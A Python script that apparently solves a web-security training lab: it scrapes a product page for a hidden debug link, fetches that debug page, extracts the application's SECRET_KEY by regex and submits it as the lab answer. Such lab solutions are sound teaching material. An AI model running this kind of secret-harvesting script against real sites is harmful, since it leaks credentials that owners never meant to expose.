#################################################
#
# Lab: Information disclosure on debug page
#
# Hack Steps: 
#      1. Fetch a product page
#      2. Extract the debug path
#      3. Fetch the debug path
#      4. Extract the secret key
#      5. Submit the solution
#
#################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a4a002303a66102808476f500a200bf.web-security-academy.net"

def main():
    print("⦗1⦘ Checking the source code.. ", end="", flush=True)

    product = fetch("/product?productId=4") 

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the debug path.. ", end="", flush=True)

    debug_path = re.findall("href=(.*)>Debug", product.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + debug_path)
    print(Fore.WHITE + "⦗3⦘ Fetching the debug page.. ", end="", flush=True)

    debug_page = fetch(debug_path)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the secret key.. ", end="", flush=True)
    
    secret_key = re.findall("SECRET_KEY.*class=\"v\">(.*) <", debug_page.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)
    print(Fore.WHITE + "⦗5⦘ Submitting the solution.. ", end="", flush=True)
      
    data = { "answer": secret_key }
    post_data("/submitsolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}")
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()